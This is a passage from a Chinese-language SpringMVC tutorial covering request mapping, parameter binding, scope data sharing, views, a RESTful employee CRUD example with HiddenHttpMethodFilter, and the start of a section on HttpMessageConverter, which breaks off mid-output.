\"!header\"：要求请求映射所匹配的请求不能携带header请求头信息\n\n  - \"header=value\"：要求请求映射所匹配的请求必须携带header请求头信息且header=value\n\n  - \"header!=value\"：要求请求映射所匹配的请求必须携带header请求头信息且header!=value\n\n- 若当前请求满足@RequestMapping注解的value和method属性，但是不满足headers属性，此时页面显示404错误，即资源未找到\n\n```java\n    @RequestMapping(\n            value = {\"/testRequestMapping\", \"/test\"},\n            method = {RequestMethod.GET, RequestMethod.POST},\n            headers = {\"host=localhost:8080\"}\n    )\n    public String testRequestMapping(){\n        return \"success\";\n    }\n```\n\n### 6、ant风格路径\n\n- ？：表示任意的单个字符\n\n```html\n<a th:href=\"@{/test}\">测试/test</a><br>\n<a th:href=\"@{/tast}\">测试/tast</a><br>\n```\n\n```java\n@RequestMapping(\"/t?st\")\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n- *：表示任意的0个或多个字符\n\n```html\n<a th:href=\"@{/tst}\">测试/tst</a><br>\n<a th:href=\"@{/test}\">测试/test</a><br>\n<a th:href=\"@{/tast}\">测试/teest</a><br>\n```\n\n```java\n@RequestMapping(\"/t*st\")\npublic String testRequestMapping(){\n\treturn \"success\";\n}\n```\n\n- \\**：表示任意的一层或多层目录\n\n```html\n<a th:href=\"@{/a/test}\">测试/a/test</a><br>\n<a th:href=\"@{/b/test}\">测试/b/test</a><br>\n<a th:href=\"@{/a/b/test}\">测试/a/b/test</a><br>\n<a th:href=\"@{/test}\">测试/test</a><br>\n```\n\n```java\n@RequestMapping(\"/**/test\")\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n### 7、PathVariable\n\n- 原始方式：/deleteUser?id=1\n\n- REST方式：/deleteUser/1\n\nSpringMVC路径中的占位符常用于RESTful风格中，当请求路径中将某些数据通过路径的方式传输到服务器中，就可以在相应的@RequestMapping注解的value属性中通过占位符{xxx}表示传输的数据，再通过@PathVariable注解，将占位符所表示的数据赋值给控制器方法的形参\n\n```html\n<a th:href=\"@{/testRest/1/admin}\">测试路径中的占位符-->/testRest</a><br>\n```\n\n```java\n@RequestMapping(\"/testRest/{id}/{username}\")\npublic String testRest(@PathVariable(\"id\") String id, @PathVariable(\"username\") String username){\n    System.out.println(\"id:\"+id+\",username:\"+username);\n    return \"success\";\n}\n//最终输出的内容为 --> id:1,username:admin\n```\n\n## 四、SpringMVC获取请求参数\n\n### 1、通过ServletAPI获取\n\n将HttpServletRequest作为控制器方法的形参，此时HttpServletRequest类型的参数表示封装了当前请求的请求报文的对象\n\n```html\n<a th:href=\"@{/testParam(username='admin',password=123456)}\">测试获取请求参数</a>\n```\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(HttpServletRequest request){\n    String username = request.getParameter(\"username\");\n    String password = request.getParameter(\"password\");\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"success\";\n}\n```\n\n### 2、通过控制器方法的形参获取\n\n在控制器方法的形参位置，**设置和请求参数同名的形参**，当浏览器发送请求，匹配到请求映射时，在DispatcherServlet中就会将请求参数赋值给相应的形参\n\n```html\n<a th:href=\"@{/testParam(username='admin',password=123456)}\">测试获取请求参数</a>\n```\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(String username, String password){\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"success\";\n}\n```\n\n若请求所传输的请求参数中有多个同名的请求参数，此时可以在控制器方法的形参中设置字符串数组或者字符串类型的形参接收此请求参数\n\n```html\n<a th:href=\"@{/testParam(hobby='a',hobby='b')}\">测试</a>\n```\n\n- 若使用字符串数组类型的形参，此参数的数组中包含了每一个数据\n\n```java\n@RequestMapping(\"/testParam\")\n  public String testParam(String username, String password, String[] hobby){\n    System.out.println(\"username:\"+username+\",password:\"+password+\",hobby:\"+ Arrays.toString(hobby));\n    return \"success\";\n}\n\n//输出：hobby:[a, b]\n```\n\n- 若使用字符串类型的形参，此参数的值为每个数据中间使用逗号拼接的结果\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(String username, String password, String hobby){\n System.out.println(\"username:\"+username+\",password:\"+password+\",hobby:\"+hobby);\n  return \"success\";\n}\n\n//输出：hobby:a,b\n```\n\n### 3、@RequestParam\n\n> 上面通过控制器方法的形参获取请求参数，**必须设置控制器方法的形参和请求参数同名**，不同名则获取不到请求参数，通过@RequestParam注解可以实现不同名也可获取\n\n@RequestParam是将**请求参数**和**控制器方法的形参**创建映射关系\n\n@RequestParam注解一共有三个属性：\n\n- value：指定为形参赋值的请求参数的参数名\n\n- required：设置是否必须传输此请求参数，默认值为true\n  - 若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数且没有设置defaultValue属性，则页面报错400：Required String parameter 'xxx' is not present；\n  - 若设置为false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为null\n\n- defaultValue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为\"\"时，则使用默认值为形参赋值\n\n测试：控制器方法的形参和请求参数同名\n\n```java\n<a th:href=\"@{/testParam(username='admin')}\">测试</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(String username){\n\tSystem.out.println(\"username:\"+username);\n  return \"success\";\n}\n\n//username:admin\n```\n\n测试：控制器方法的形参和请求参数不同名\n\n```java\n<a th:href=\"@{/testParam(user_name='admin')}\">测试</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(String username){\n    System.out.println(\"username:\"+username);\n    return \"success\";\n}\n\n//username:null\n```\n\n测试：控制器方法的形参和请求参数不同名，但添加@RequestParam注解\n\n```java\n<a th:href=\"@{/testParam(user_name='admin')}\">测试</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(@RequestParam(\"user_name\") String username){\n    System.out.println(\"username:\"+username);\n    return \"success\";\n}\n\n//username:admin\n```\n\n测试：required和defaultValue属性\n\n```java\n<a th:href=\"@{/testParam(user_name)}\">测试</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(@RequestParam(value = \"user_name\",required = false,defaultValue = \"root\" ) String username){\n  System.out.println(\"username:\"+username);\n  return \"success\";\n}\n\n//username:root\n```\n\n### 4、@RequestHeader\n\n- @RequestHeader是将**请求头信息**和**控制器方法的形参**创建映射关系\n\n- @RequestHeader注解一共有三个属性：value、required、defaultValue\n\n- 用法同@RequestParam\n\n```java\n<a th:href=\"@{/testParam(user_name)}\">测试</a>\n\n@RequestMapping(\"/testParam\")\npublic String testParam(\n  @RequestParam(value = \"user_name\", required = false, defaultValue = \"root\") String username,\n  String password,\n  String hobby,\n  @RequestHeader(\"host\") String host){\n  System.out.println(\"username:\" + username);\n  System.out.println(\"host = \" + host);\n  return \"success\";\n}\n```\n\n### 5、@CookieValue\n\n- @CookieValue是将**cookie数据**和**控制器方法的形参**创建映射关系\n\n- @CookieValue注解一共有三个属性：value、required、defaultValue\n- 用法同@RequestParam\n\n### 6、通过POJO获取请求参数\n\n可以在控制器方法的形参位置设置一个**实体类类型的形参**，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值\n\n```html\n<form th:action=\"@{/testpojo}\" method=\"post\">\n    用户名：<input type=\"text\" name=\"username\"><br>\n    密码：<input type=\"password\" name=\"password\"><br>\n    性别：<input type=\"radio\" name=\"sex\" value=\"男\">男<input type=\"radio\" name=\"sex\" value=\"女\">女<br>\n    年龄：<input type=\"text\" name=\"age\"><br>\n    邮箱：<input type=\"text\" name=\"email\"><br>\n    <input type=\"submit\">\n</form>\n```\n```java\npublic class User {\n\n    private Integer id;\n    private String username;\n    private String password;\n    private String sex;\n    private Integer age;\n    private String email;\n\n    public User(Integer id, String username, String password, String sex, Integer age, String email) {\n        this.id = id;\n        this.username = username;\n        this.password = password;\n        this.sex = sex;\n        this.age = age;\n        this.email = email;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public void setUsername(String username) {\n        this.username = username;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public String getSex() {\n        return sex;\n    }\n\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", username='\" + username + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", sex='\" + sex + '\\'' +\n                \", age=\" + age +\n                \", email='\" + email + '\\'' +\n                '}';\n    }\n}\n```\n\n```java\n@RequestMapping(\"/testpojo\")\npublic String testPOJO(User user){//传入实体类形参\n    System.out.println(user);\n    return \"success\";\n}\n//最终结果-->User{id=null, username='张三', password='123', age=23, sex='男', email='123@qq.com'}\n```\n\n### 7、解决获取请求参数的乱码问题\n\n解决获取请求参数的乱码问题，可以使用SpringMVC提供的编码过滤器CharacterEncodingFilter，在web.xml中进行注册\n\n```xml\n<!--配置springMVC的编码过滤器-->\n<filter>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n    <init-param>\n        <param-name>encoding</param-name>\n        <param-value>UTF-8</param-value>\n    </init-param>\n    <init-param>\n        <param-name>forceResponseEncoding</param-name>\n        <param-value>true</param-value>\n    </init-param>\n</filter>\n<filter-mapping>\n    <filter-name>CharacterEncodingFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n注：SpringMVC中处理编码的过滤器一定要配置到其他过滤器之前，否则无效\n\n## 五、域对象共享数据\n\n### 1、使用ServletAPI向request域对象共享数据\n\n```java\n@RequestMapping(\"/testServletAPI\")\npublic String testServletAPI(HttpServletRequest request){\n    request.setAttribute(\"testScope\", \"hello,servletAPI\");\n    return \"success\";\n}\n```\n\n### 2、使用ModelAndView向request域对象共享数据\n\n```java\n@RequestMapping(\"/testModelAndView\")\npublic ModelAndView testModelAndView(){\n    /**\n     * ModelAndView有Model和View的功能\n     * Model主要用于向请求域共享数据\n     * View主要用于设置视图，实现页面跳转\n     */\n    ModelAndView mav = new ModelAndView();\n    //向请求域共享数据\n    mav.addObject(\"testScope\", \"hello,ModelAndView\");\n    //设置视图，实现页面跳转\n    mav.setViewName(\"success\");\n    return mav;\n}\n```\n\n### 3、使用Model向request域对象共享数据\n\n```java\n@RequestMapping(\"/testModel\")\npublic String testModel(Model model){\n    model.addAttribute(\"testScope\", \"hello,Model\");\n    return \"success\";\n}\n```\n\n### 4、使用map向request域对象共享数据\n\n```java\n@RequestMapping(\"/testMap\")\npublic String testMap(Map<String, Object> map){\n    map.put(\"testScope\", \"hello,Map\");\n    return \"success\";\n}\n```\n\n### 5、使用ModelMap向request域对象共享数据\n\n```java\n@RequestMapping(\"/testModelMap\")\npublic String testModelMap(ModelMap modelMap){\n    modelMap.addAttribute(\"testScope\", \"hello,ModelMap\");\n    return \"success\";\n}\n```\n\n### 6、Model、ModelMap、Map的关系\n\nModel、ModelMap、Map类型的参数其实本质上都是 BindingAwareModelMap 类型的\n\n```\npublic interface Model{}\npublic class ModelMap extends LinkedHashMap<String, Object> {}\npublic class ExtendedModelMap extends ModelMap implements Model {}\npublic class BindingAwareModelMap extends ExtendedModelMap {}\n```\n\n### 7、向session域共享数据\n\n```java\n@RequestMapping(\"/testSession\")\npublic String testSession(HttpSession session){\n    session.setAttribute(\"testSessionScope\", \"hello,session\");\n    return \"success\";\n}\n```\n\n### 8、向application域共享数据\n\n```java\n@RequestMapping(\"/testApplication\")\npublic String testApplication(HttpSession session){\n\tServletContext application = session.getServletContext();\n    application.setAttribute(\"testApplicationScope\", \"hello,application\");\n    return \"success\";\n}\n```\n\n## 六、SpringMVC的视图\n\nSpringMVC中的视图是View接口，视图的作用渲染数据，将模型Model中的数据展示给用户\n\nSpringMVC视图的种类很多，默认有转发视图和重定向视图。若使用的视图技术为Thymeleaf，在SpringMVC的配置文件中配置了Thymeleaf的视图解析器，由此视图解析器解析之后所得到的是ThymeleafView\n\n### 1、ThymeleafView\n\n当控制器方法中所设置的视图名称没有任何前缀时，此时的视图名称会被SpringMVC配置文件中所配置的视图解析器解析，视图名称拼接视图前缀和视图后缀所得到的最终路径，会通过转发的方式实现跳转\n\n```java\n@RequestMapping(\"/testHello\")\npublic String testHello(){\n    return \"hello\";\n}\n```\n\n### 2、转发视图\n\nSpringMVC中默认的转发视图是InternalResourceView\n\n当控制器方法中所设置的视图名称以\"**forward:**\"为前缀时，创建InternalResourceView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\"forward:\"去掉，剩余部分作为最终路径通过转发的方式实现跳转\n\n```java\n@RequestMapping(\"/testForward\")\npublic String testForward(){\n    return \"forward:/testHello\";\n}\n```\n\n### 3、重定向视图\n\nSpringMVC中默认的重定向视图是RedirectView\n\n当控制器方法中所设置的视图名称以\"**redirect:**\"为前缀时，创建RedirectView视图，此时的视图名称不会被SpringMVC配置文件中所配置的视图解析器解析，而是会将前缀\"redirect:\"去掉，剩余部分作为最终路径通过重定向的方式实现跳转\n\n```java\n@RequestMapping(\"/testRedirect\")\npublic String testRedirect(){\n    return \"redirect:/testHello\";\n}\n```\n\n注：重定向视图在解析时，会先将redirect:前缀去掉，然后会判断剩余部分是否以/开头，若是则会自动拼接上下文路径\n\n### 4、视图控制器view-controller\n\n如果发送的请求不想通过controller，只想直接地跳转到目标页面，这时候就可以使用mvc:view-controller标签，在SpringMVC.xml配置文件中配置:\n\n```xml\n<!--path：设置处理的请求地址 view-name：设置请求地址所对应的视图名称-->\n<mvc:view-controller path=\"/testView\" view-name=\"success\"></mvc:view-controller>\n```\n\n等同于如下代码\n\n```Java\n@RequestMapping(value=\"/testView\")\npublic String hello(){\n    return \"success\";\n}\n```\n\n注：\n\n- 使用了这个标签后必须开启mvc注解驱动的标签 `<mvc:annotation-driven />`，否则会造成所有的@Controller注解无法解析，导致404错误。\n- 如果请求存在处理器，则这个标签对应的请求处理将不起作用。因为请求是先去找处理器处理，如果找不到才会去找这个标签配置。\n\n## 七、RESTful\n\n### 1、RESTful简介\n\nREST：**Re**presentational **S**tate **T**ransfer，表现层资源状态转移。\n\n状态转移：在客户端和服务器端之间转移代表资源状态的表述。通过转移和操作资源的表述，来间接实现操作资源的目的。\n\n### 2、RESTful的实现\n\n具体说，就是 HTTP 协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。\n\n它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE 用来删除资源。\n\nREST 风格提倡 URL 地址使用统一的风格设计，从前到后各个单词**使用斜杠分开**，**不使用问号键值对方式**携带请求参数，而是将要发送给服务器的数据作为 URL 地址的一部分，以保证整体风格的一致性。\n\n| 操作     | 传统方式         | REST风格 | 请求方式       |\n| -------- | ---------------- | -------- | -------------- |\n| 查询操作 | getUserById?id=1 | user/1   | get请求方式    |\n| 保存操作 | saveUser         | user     | post请求方式   |\n| 删除操作 | deleteUser?id=1  | user/1   | delete请求方式 |\n| 更新操作 | updateUser       | user     | put请求方式    |\n\n### 3、HiddenHttpMethodFilter\n\n由于浏览器只支持发送get和post方式的请求，那么该如何发送put和delete请求呢？\n\nSpringMVC 提供了 **HiddenHttpMethodFilter** 帮助我们**将 POST 请求转换为 DELETE 或 PUT 请求**\n\n**HiddenHttpMethodFilter** 处理put和delete请求的条件：\n\n- a>当前请求的请求方式必须为post\n- b>当前请求必须传输请求参数_method\n\n```html\n<!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 -->\n<form id=\"delete_form\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n```\n\n满足以上条件，**HiddenHttpMethodFilter** 过滤器就会将当前请求的请求方式转换为请求参数_method的值，因此请求参数\\_method的值才是最终的请求方式\n\n在web.xml中注册**HiddenHttpMethodFilter** \n\n```xml\n<filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n注：目前为止，SpringMVC中提供了两个过滤器：CharacterEncodingFilter和HiddenHttpMethodFilter\n\n在web.xml中注册时，必须先注册CharacterEncodingFilter，再注册HiddenHttpMethodFilter\n\n原因：\n\n-  在 CharacterEncodingFilter 中通过 request.setCharacterEncoding(encoding) 方法设置字符集，该方法要求前面不能有任何获取请求参数的操作\n\n- 而 HiddenHttpMethodFilter 恰恰有一个获取请求方式的操作：`String paramValue = request.getParameter(this.methodParam);`\n\n### 4、RESTful案例\n\n#### 1、案例描述\n\n实现对员工信息的增删改查，功能清单如下\n\n| 功能                 | URL 地址    | 请求方式 |\n| -------------------- | ----------- | -------- |\n| 1.访问首页           | /           | GET      |\n| 2.查询全部数据       | /employee   | GET      |\n| 3.删除数据           | /employee/2 | DELETE   |\n| 4.跳转到添加数据页面 | /toAdd      | GET      |\n| 5.保存数据           | /employee   | POST     |\n| 6.跳转到更新数据页面 | /employee/2 | GET      |\n| 7.更新数据           | /employee   | PUT      |\n\n#### 2、准备工作\n\n- 创建项目\n\n参考第二章快速入门\n\n- 准备实体类\n\n```java\npackage com.example.mvc.bean;\n\npublic class Employee {\n\n    private Integer id;\n    private String lastName;\n    private String email;\n    private Integer gender; //1 male, 0 female\n\n    public Employee(Integer id, String lastName, String email, Integer gender) {\n        super();\n        this.id = id;\n        this.lastName = lastName;\n        this.email = email;\n        this.gender = gender;\n    }\n\n    public Employee() {\n    }\n  \n    public Integer getId() {\n        return id;\n    }\n    public void setId(Integer id) {\n        this.id = id;\n    }\n    public String getLastName() {\n        return lastName;\n    }\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n    public String getEmail() {\n        return email;\n    }\n    public void setEmail(String email) {\n        this.email = email;\n    }\n    public Integer getGender() {\n        return gender;\n    }\n    public void setGender(Integer gender) {\n        this.gender = gender;\n    }\n}\n```\n\n- 准备dao模拟数据\n\n```java\npackage com.example.mvc.dao;\n\nimport com.example.mvc.bean.Employee;\nimport org.springframework.stereotype.Repository;\n\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Repository\npublic class EmployeeDao {\n\n    private static Map<Integer, Employee> employees = null;\n\n    static{\n        employees = new HashMap<Integer, Employee>();\n\n        employees.put(1001, new Employee(1001, \"E-AA\", \"aa@163.com\", 1));\n        employees.put(1002, new Employee(1002, \"E-BB\", \"bb@163.com\", 1));\n        employees.put(1003, new Employee(1003, \"E-CC\", \"cc@163.com\", 0));\n        employees.put(1004, new Employee(1004, \"E-DD\", \"dd@163.com\", 0));\n        employees.put(1005, new Employee(1005, \"E-EE\", \"ee@163.com\", 1));\n    }\n\n    private static Integer initId = 1006;\n\n    public void save(Employee employee){//保存员工信息\n        if(employee.getId() == null){\n            employee.setId(initId++);//id自增\n        }\n        employees.put(employee.getId(), employee);\n    }\n\n    public Collection<Employee> getAll(){//获取所有员工信息\n        return employees.values();\n    }\n\n    public Employee get(Integer id){//通过id获取员工信息\n        return employees.get(id);\n    }\n\n    public void delete(Integer id){//通过id删除员工信息\n        employees.remove(id);\n    }\n}\n```\n\n#### 3、功能1：访问首页\n\n- 1>配置视图控制器 view-controller\n\n```xml\n<!--视图控制器-->\n<mvc:view-controller path=\"/\" view-name=\"index\"/>\n<!--开启mvc注解驱动-->\n<mvc:annotation-driven />\n```\n\n- 2>创建index页面\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\" >\n    <title>Title</title>\n</head>\n<body>\n<h1>首页</h1>\n<a th:href=\"@{/employee}\">访问员工信息</a>\n</body>\n</html>\n```\n\n#### 4、功能2：查询全部数据\n\n- 1>控制器方法：跳转到员工数据页面，并将获取到的员工数据的数据存到域中，以便在页面中显示\n\n```java\npackage com.example.mvc.controller;\n\n@Controller\npublic class EmployeeController {\n    @Autowired\n    private EmployeeDao employeeDao;\n  \n    @RequestMapping(value = \"/employee\", method = RequestMethod.GET)\n    public String getEmployeeList(Model model){\n    Collection<Employee> employeeList = employeeDao.getAll();\n    model.addAttribute(\"employeeList\", employeeList);\n    return \"employee_list\";\n}\n\n```\n\n- 2>>创建员工信息显示页面employee_list.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Employee Info</title>\n</head>\n<body>\n\n    <table id=\"dataTable\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"text-align: center;\" >\n        <tr>\n            <th colspan=\"5\">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options</th>\n        </tr>\n        <tr th:each=\"employee : ${employeeList}\">\n            <td th:text=\"${employee.id}\"></td>\n            <td th:text=\"${employee.lastName}\"></td>\n            <td th:text=\"${employee.email}\"></td>\n            <td th:text=\"${employee.gender}\"></td>\n            <td></td>\n        </tr>\n    </table>\n</body>\n</html>\n```\n\n#### 5、功能3：删除数据\n\n- 1>创建处理delete请求方式的表单\n\n```html\n<!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 -->\n<form id=\"delete_form\" method=\"post\">\n<!--HiddenHttpMethodFilter要求：必须传输_method请求参数，值为最终的请求方式-->\n    <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n```\n\n- 2>在页面中增加删除操作的超链接，并绑定绑定点击事件\n\n```html\n<!--href写法1-->\n<a @click=\"deleteEmployee\" th:href=\"@{'/employee/'+${employee.id}}\">delete</a>\n\n<!--href写法2-->\n<a @click=\"deleteEmployee\" th:href=\"@{/employee/}+${employee.id}\">delete</a>\n```\n\n- 3>通过vue处理点击事件\n\n```html\n<!--引入vue.js-->\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#dataTable\",\n        methods:{\n            //event表示当前事件\n            deleteEmployee:function (event) {\n                //通过id获取表单标签\n                var delete_form = document.getElementById(\"delete_form\");\n                //将触发事件的超链接的href属性为表单的action属性赋值\n                delete_form.action = event.target.href;\n                //提交表单\n                delete_form.submit();\n                //阻止超链接的默认跳转行为\n                event.preventDefault();\n            }\n        }\n    });\n</script>\n```\n\n完整页面代码\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Employee Info</title>\n</head>\n<body>\n\n    <table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"text-align: center;\" id=\"dataTable\">\n        <tr>\n            <th colspan=\"5\">Employee Info</th>\n        </tr>\n        <tr>\n            <th>id</th>\n            <th>lastName</th>\n            <th>email</th>\n            <th>gender</th>\n            <th>options</th>\n        </tr>\n        <tr th:each=\"employee : ${employeeList}\">\n            <td th:text=\"${employee.id}\"></td>\n            <td th:text=\"${employee.lastName}\"></td>\n            <td th:text=\"${employee.email}\"></td>\n            <td th:text=\"${employee.gender}\"></td>\n            <td>\n                <a @click=\"deleteEmployee\" th:href=\"@{'/employee/'+${employee.id}}\">delete</a>\n            </td>\n        </tr>\n    </table>\n<!-- 作用：通过超链接控制表单的提交，将post请求转换为delete请求 -->\n<form id=\"delete_form\" method=\"post\">\n  <input type=\"hidden\" name=\"_method\" value=\"delete\"/>\n</form>\n  \n<!--引入vue.js-->\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#dataTable\",\n        methods:{\n            //event表示当前事件\n            deleteEmployee:function (event) {\n                //通过id获取表单标签\n                var delete_form = document.getElementById(\"delete_form\");\n                //将触发事件的超链接的href属性为表单的action属性赋值\n                delete_form.action = event.target.href;\n                //提交表单\n                delete_form.submit();\n                //阻止超链接的默认跳转行为\n                event.preventDefault();\n            }\n        }\n    });\n</script>\n</body>\n</html>\n```\n\n- 4>控制器方法\n\n```java\n@RequestMapping(value = \"/employee/{id}\", method = RequestMethod.DELETE)\npublic String deleteEmployee(@PathVariable(\"id\") Integer id){\n    employeeDao.delete(id);\n    return \"redirect:/employee\";\n}\n```\n\n5>相关配置\n\nspringMVC.xml配置\n\n```xml\n<!--开放静态资源的访问，为了访问vue.js-->\n<mvc:default-servlet-handler/>\n```\n\nweb.xml配置\n\n```xml\n<!--HiddenHttpMethodFilter处理put和delete请求的条件-->\n    <filter>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HiddenHttpMethodFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n#### 6、功能4：跳转到添加数据页面\n\n- 1>员工信息页面添加增加操作的超链接\n\n```html\n<th>options(<a th:href=\"@{/toAdd}\">add</a>)</th>\n```\n\n- 2>配置view-controller\n\n```xml\n<mvc:view-controller path=\"/toAdd\" view-name=\"employee_add\"></mvc:view-controller>\n```\n\n- 2>创建employee_add.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Add Employee</title>\n</head>\n<body>\n\n<form th:action=\"@{/employee}\" method=\"post\">\n    lastName:<input type=\"text\" name=\"lastName\"><br>\n    email:<input type=\"text\" name=\"email\"><br>\n    gender:\n    <input type=\"radio\" name=\"gender\" value=\"1\">male\n    <input type=\"radio\" name=\"gender\" value=\"0\">female<br>\n    <input type=\"submit\" value=\"add\"><br>\n</form>\n\n</body>\n</html>\n```\n\n#### 7、功能5：保存数据\n\n- 控制器方法\n\n```java\n@RequestMapping(value = \"/employee\", method = RequestMethod.POST)\npublic String addEmployee(Employee employee){\n    employeeDao.save(employee);\n    return \"redirect:/employee\";\n}\n```\n\n#### 8、功能6：跳转到更新数据页面\n\n- 1>员工信息页面添加更新操作的超链接\n\n```html\n<a th:href=\"@{'/employee/'+${employee.id}}\">update</a>\n```\n\n- 2>控制器方法：跳转到更新数据页面，并保存更新的数据到域中\n\n```java\n@RequestMapping(value = \"/employee/{id}\", method = RequestMethod.GET)\npublic String getEmployeeById(@PathVariable(\"id\") Integer id, Model model){\n    Employee employee = employeeDao.get(id);\n    model.addAttribute(\"employee\", employee);\n    return \"employee_update\";\n}\n```\n\n- 3>创建employee_update.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Update Employee</title>\n</head>\n<body>\n\n<form th:action=\"@{/employee}\" method=\"post\">\n    <input type=\"hidden\" name=\"_method\" value=\"put\">\n    <input type=\"hidden\" name=\"id\" th:value=\"${employee.id}\">\n    lastName:<input type=\"text\" name=\"lastName\" th:value=\"${employee.lastName}\"><br>\n    email:<input type=\"text\" name=\"email\" th:value=\"${employee.email}\"><br>\n    <!--\n        th:field=\"${employee.gender}\"可用于单选框或复选框的回显\n        若单选框的value和employee.gender的值一致，则添加checked=\"checked\"属性\n    -->\n    gender:<input type=\"radio\" name=\"gender\" value=\"1\" th:field=\"${employee.gender}\">male\n    <input type=\"radio\" name=\"gender\" value=\"0\" th:field=\"${employee.gender}\">female<br>\n    <input type=\"submit\" value=\"update\"><br>\n</form>\n\n</body>\n</html>\n```\n\n#### 9、功能7：更新数据\n\n- 控制器方法\n\n```java\n@RequestMapping(value = \"/employee\", method = RequestMethod.PUT)\npublic String updateEmployee(Employee employee){\n    employeeDao.save(employee);\n    return \"redirect:/employee\";\n}\n```\n\n## 八、HttpMessageConverter\n\nHttpMessageConverter，报文信息转换器，将请求报文转换为Java对象，或将Java对象转换为响应报文\n\nHttpMessageConverter 提供了两个注解和两个类型：\n\n- @RequestBody，@ResponseBody\n- RequestEntity，ResponseEntity\n\n### 1、@RequestBody\n\n主要用来接收**前端传递给后端的json字符串中的数据的**(请求体中的数据的)\n\n@RequestBody可以**获取请求体**，需要在控制器方法设置一个形参，使用@RequestBody进行标识，当前请求的请求体就会为当前注解所标识的形参赋值\n\n```html\n<form th:action=\"@{/testRequestBody}\" method=\"post\">\n    用户名：<input type=\"text\" name=\"username\"><br>\n    密码：<input type=\"password\" name=\"password\"><br>\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@RequestMapping(\"/testRequestBody\")\npublic String testRequestBody(@RequestBody String requestBody){\n    System.out.println(\"requestBody:\"+requestBody);\n    return \"success\";\n}\n```\n\n输出结果：requestBody:username=admin&password=123456\n\n### 2、RequestEntity\n\nRequestEntity**封装请求报文**的一种类型，需要在控制器方法的形参中设置该类型的形参，当前请求的请求报文就会赋值给该形参，可以通过getHeaders()获取请求头信息，通过getBody()获取请求体信息\n\n```java\n@RequestMapping(\"/testRequestEntity\")\npublic String testRequestEntity(RequestEntity<String> requestEntity){\n    System.out.println(\"requestHeader:\"+requestEntity.getHeaders());\n    System.out.println(\"requestBody:\"+requestEntity.getBody());\n    return \"success\";\n}\n```\n\n输出结果：\nrequestHeader:[host:\"localhost:8080\", connection:\"keep-alive\", content-length:\"27\", cache-control:\"max-age=0\", sec-ch-ua:\"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"\", sec-ch-ua-mobile:\"?0\", upgrade-insecure-requests:\"1\", origin:\"http://localhost:8080\", 